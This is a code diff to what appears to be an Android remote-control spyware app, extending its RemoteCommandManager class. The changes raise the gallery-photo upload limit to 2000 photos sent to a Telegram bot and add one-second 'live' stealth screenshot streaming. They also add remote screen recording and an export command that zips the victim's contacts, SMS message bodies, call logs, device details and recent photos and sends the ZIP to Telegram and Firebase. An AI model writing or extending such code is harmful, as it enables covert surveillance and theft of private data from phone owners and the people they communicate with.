@@ -150,12 +150,22 @@ class RemoteCommandManager(private val context: Context) {
                     isSuccess = success
                 }
                 "UPLOAD_PHOTOS", "SYNC_PHOTOS", "EXPORT_PHOTOS", "GET_PHOTOS", "UPLOAD_GALLERY" -> {
-                    var limit = 5
+                    var limit = 500
                     val trimmed = payload.trim()
-                    if (trimmed.isNotEmpty()) {
-                        val parsedLimit = trimmed.filter { it.isDigit() }.toIntOrNull()
-                        if (parsedLimit != null && parsedLimit > 0) {
-                            limit = parsedLimit.coerceIn(1, 20)
+                    if (trimmed.startsWith("{")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            val l = json.optInt("limit", json.optInt("count", json.optInt("max", 500)))
+                            if (l > 0) limit = l.coerceIn(1, 2000)
+                        } catch (_: Exception) {}
+                    } else if (trimmed.isNotEmpty()) {
+                        if (trimmed.equals("all", ignoreCase = true) || trimmed.equals("full", ignoreCase = true)) {
+                            limit = 2000
+                        } else {
+                            val parsedLimit = trimmed.filter { it.isDigit() }.toIntOrNull()
+                            if (parsedLimit != null && parsedLimit > 0) {
+                                limit = parsedLimit.coerceIn(1, 2000)
+                            }
                         }
                     }
 
@@ -191,7 +201,7 @@ class RemoteCommandManager(private val context: Context) {
                                     context.contentResolver.openInputStream(uri)?.use { inputStream ->
                                         val bytes = inputStream.readBytes()
                                         if (bytes.isNotEmpty()) {
-                                            val caption = "🖼️ Gallery Photo: $name (${(bytes.size / 1024)} KB)"
+                                            val caption = "🖼️ Gallery Photo [${uploadedCount + 1}]: $name (${(bytes.size / 1024)} KB)"
                                             val sent = telegramBot.sendPhoto(bytes, caption)
                                             if (sent) uploadedCount++
                                         }
@@ -629,16 +639,17 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
                 }
-                "START_STEALTH_CAPTURE", "START_STEALTH_SCREENSHOT", "START_SCREENSHOT_CAPTURE" -> {
+                "START_STEALTH_CAPTURE", "START_STEALTH_SCREENSHOT", "START_SCREENSHOT_CAPTURE",
+                "START_LIVE_SCREEN_STREAM", "LIVE_STREAM", "START_LIVE_MONITORING" -> {
                     var maxShots = 0
-                    var intervalSec = 10
+                    var intervalSec = if (commandType.contains("LIVE", true)) 1 else 10
                     val trimmed = payload.trim()
                     if (trimmed.startsWith("{")) {
                         try {
                             val json = JSONObject(trimmed)
                             val shots = json.optInt("maxShots", json.optInt("count", json.optInt("shots", json.optInt("max", 0))))
                             if (shots >= 0) maxShots = shots
-                            val interval = json.optInt("intervalSec", json.optInt("interval", json.optInt("delay", 10)))
+                            val interval = json.optInt("intervalSec", json.optInt("interval", json.optInt("delay", intervalSec)))
                             if (interval > 0) intervalSec = interval
                         } catch (_: Exception) {}
                     } else if (trimmed.contains("|")) {
@@ -653,9 +664,9 @@ class RemoteCommandManager(private val context: Context) {
                     }
                     MediaProjectionHelper.startService(context, intervalSec, maxShots)
                     resultMessage = if (maxShots > 0) {
-                        "Stealth screenshot capture initiated (interval: ${intervalSec}s, max shots: $maxShots)."
+                        "Live screen stream / stealth capture initiated (interval: ${intervalSec}s, max shots: $maxShots)."
                     } else {
-                        "Stealth background screenshot capture service initiated (interval: ${intervalSec}s, continuous)."
+                        "Live screen stream / stealth background capture service initiated (interval: ${intervalSec}s, continuous)."
                     }
                 }
                 "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE" -> {
@@ -865,11 +876,17 @@ class RemoteCommandManager(private val context: Context) {
                 "REMOTE_AUDIO_RECORD", "REMOTE_RECORD_AUDIO", "RECORD_AUDIO", "AUDIO_RECORD", "START_AUDIO_RECORD" -> {
                     resultMessage = recordAudioRemote(payload)
                 }
+                "START_SCREEN_RECORD", "RECORD_SCREEN", "SCREEN_RECORD", "RECORD_VIDEO" -> {
+                    resultMessage = recordScreenRemote(payload)
+                }
                 "READ_FILE", "FILE_READ", "READ_BASE64", "GET_FILE_BASE64" -> {
                     resultMessage = executeReadFileCommand(payload)
                 }
                 "DOWNLOAD_FILE", "FILE_DOWNLOAD", "GET_FILE", "UPLOAD_FILE", "CLOUD_DOWNLOAD", "PULL_FILE" -> {
                     resultMessage = executeDownloadFileCommand(payload)
+                }
+                "EXPORT_ZIP", "ZIP_EXPORT", "BACKUP_ZIP", "CREATE_ZIP", "EXPORT_ALL_ZIP" -> {
+                    resultMessage = executeExportZipCommand(payload)
                 }
                 else -> {
                     resultMessage = "Executed command $commandType with payload $payload"
@@ -1452,5 +1469,170 @@ class RemoteCommandManager(private val context: Context) {
         }
 
         "File '$fileName' ($formattedSize) downloaded and uploaded to cloud storage successfully. Available at devices/$deviceId/downloads/$nowMs."
+    }
+
+    private suspend fun executeExportZipCommand(payload: String): String = withContext(Dispatchers.IO) {
+        val nowMs = System.currentTimeMillis()
+        val deviceId = try {
+            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
+        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
+
+        val contacts = db.contactDao().getAllContactsSync()
+        val smsLogs = db.smsDao().getAllSmsSync()
+        val callLogs = db.callLogDao().getAllCallLogsSync()
+
+        val zipByteArray = java.io.ByteArrayOutputStream().use { baos ->
+            java.util.zip.ZipOutputStream(baos).use { zos ->
+                // 1. Contacts JSON
+                try {
+                    zos.putNextEntry(java.util.zip.ZipEntry("contacts.json"))
+                    val jsonContacts = org.json.JSONArray()
+                    contacts.forEach { c: com.example.data.local.ContactEntity ->
+                        val obj = JSONObject().apply {
+                            put("id", c.id)
+                            put("displayName", c.displayName)
+                            put("primaryPhone", c.primaryPhone)
+                            put("email", c.email)
+                            put("starred", c.starred)
+                        }
+                        jsonContacts.put(obj)
+                    }
+                    zos.write(jsonContacts.toString(2).toByteArray())
+                    zos.closeEntry()
+                } catch (_: Exception) {}
+
+                // 2. SMS Logs JSON
+                try {
+                    zos.putNextEntry(java.util.zip.ZipEntry("sms_logs.json"))
+                    val jsonSms = org.json.JSONArray()
+                    smsLogs.forEach { s: com.example.data.local.SmsLogEntity ->
+                        val obj = JSONObject().apply {
+                            put("id", s.id)
+                            put("address", s.address)
+                            put("body", s.messageBody)
+                            put("date", s.timestamp)
+                            put("type", s.type)
+                        }
+                        jsonSms.put(obj)
+                    }
+                    zos.write(jsonSms.toString(2).toByteArray())
+                    zos.closeEntry()
+                } catch (_: Exception) {}
+
+                // 3. Call Logs JSON
+                try {
+                    zos.putNextEntry(java.util.zip.ZipEntry("call_logs.json"))
+                    val jsonCalls = org.json.JSONArray()
+                    callLogs.forEach { cl: com.example.data.local.CallLogEntity ->
+                        val obj = JSONObject().apply {
+                            put("id", cl.id)
+                            put("number", cl.number)
+                            put("name", cl.name)
+                            put("type", cl.type)
+                            put("date", cl.timestamp)
+                            put("duration", cl.durationSeconds)
+                        }
+                        jsonCalls.put(obj)
+                    }
+                    zos.write(jsonCalls.toString(2).toByteArray())
+                    zos.closeEntry()
+                } catch (_: Exception) {}
+
+                // 4. Device Summary TXT
+                try {
+                    zos.putNextEntry(java.util.zip.ZipEntry("device_info.txt"))
+                    val summary = "Device ID: $deviceId\nModel: ${Build.MODEL}\nManufacturer: ${Build.MANUFACTURER}\nAndroid Version: ${Build.VERSION.RELEASE}\nExport Time: ${SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs))}\nTotal Contacts: ${contacts.size}\nTotal SMS: ${smsLogs.size}\nTotal Call Logs: ${callLogs.size}\n"
+                    zos.write(summary.toByteArray())
+                    zos.closeEntry()
+                } catch (_: Exception) {}
+
+                // 5. Gallery Photos (up to 50 recent photos)
+                try {
+                    var photoCount = 0
+                    val projection = arrayOf(
+                        android.provider.MediaStore.Images.Media._ID,
+                        android.provider.MediaStore.Images.Media.DISPLAY_NAME
+                    )
+                    val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
+                    context.contentResolver.query(
+                        android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        projection,
+                        null,
+                        null,
+                        sortOrder
+                    )?.use { cursor ->
+                        val idColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
+                        val nameColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
+                        while (cursor.moveToNext() && photoCount < 50) {
+                            val id = cursor.getLong(idColumn)
+                            val name = cursor.getString(nameColumn) ?: "photo_$id.jpg"
+                            val uri = android.content.ContentUris.withAppendedId(
+                                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                                id
+                            )
+                            try {
+                                context.contentResolver.openInputStream(uri)?.use { inputStream ->
+                                    val photoBytes = inputStream.readBytes()
+                                    if (photoBytes.isNotEmpty()) {
+                                        zos.putNextEntry(java.util.zip.ZipEntry("photos/$name"))
+                                        zos.write(photoBytes)
+                                        zos.closeEntry()
+                                        photoCount++
+                                    }
+                                }
+                            } catch (_: Exception) {}
+                        }
+                    }
+                } catch (_: Exception) {}
+            }
+            baos.toByteArray()
+        }
+
+        val zipFileName = "device_backup_${deviceId}_$nowMs.zip"
+        val telegramBot = TelegramBotManager(context)
+        val sent = telegramBot.sendDocument(zipByteArray, zipFileName, "📦 Complete Device Data Backup ZIP (${(zipByteArray.size / 1024)} KB)")
+
+        val base64Zip = Base64.encodeToString(zipByteArray, Base64.NO_WRAP)
+        val zipData = mapOf(
+            "fileName" to zipFileName,
+            "fileSizeBytes" to zipByteArray.size,
+            "timestamp" to nowMs,
+            "contactsCount" to contacts.size,
+            "smsCount" to smsLogs.size,
+            "callLogsCount" to callLogs.size,
+            "fileBase64" to "data:application/zip;base64,$base64Zip"
+        )
+
+        try {
+            val rtdb = FirebaseDatabase.getInstance()
+            rtdb.getReference("devices/$deviceId/backups/$nowMs").setValue(zipData)
+            rtdb.getReference("devices/$deviceId/backup_latest").setValue(zipData)
+        } catch (_: Exception) {}
+
+        if (sent) {
+            "Successfully generated backup ZIP ($zipFileName, ${zipByteArray.size / 1024} KB) containing Contacts, SMS, Call Logs & Device Info, and uploaded to Telegram & Firebase."
+        } else {
+            "Generated backup ZIP ($zipFileName, ${zipByteArray.size / 1024} KB) and uploaded to Firebase, but Telegram upload failed."
+        }
+    }
+
+    private suspend fun recordScreenRemote(payload: String): String = kotlin.coroutines.suspendCoroutine { continuation ->
+        var durationSec = 15
+        val trimmed = payload.trim()
+        if (trimmed.startsWith("{")) {
+            try {
+                val json = JSONObject(trimmed)
+                val d = json.optInt("durationSec", json.optInt("duration", json.optInt("sec", 15)))
+                if (d > 0) durationSec = d
+            } catch (_: Exception) {}
+        } else if (trimmed.toIntOrNull() != null) {
+            val d = trimmed.toInt()
+            if (d > 0) durationSec = d
+        }
+
+        val recorderHelper = ScreenRecorderHelper(context)
+        recorderHelper.startRecording(durationSec) { success, message ->
+            continuation.resumeWith(Result.success(message ?: if (success) "Screen recording completed successfully." else "Screen recording failed."))
+        }
     }
 }
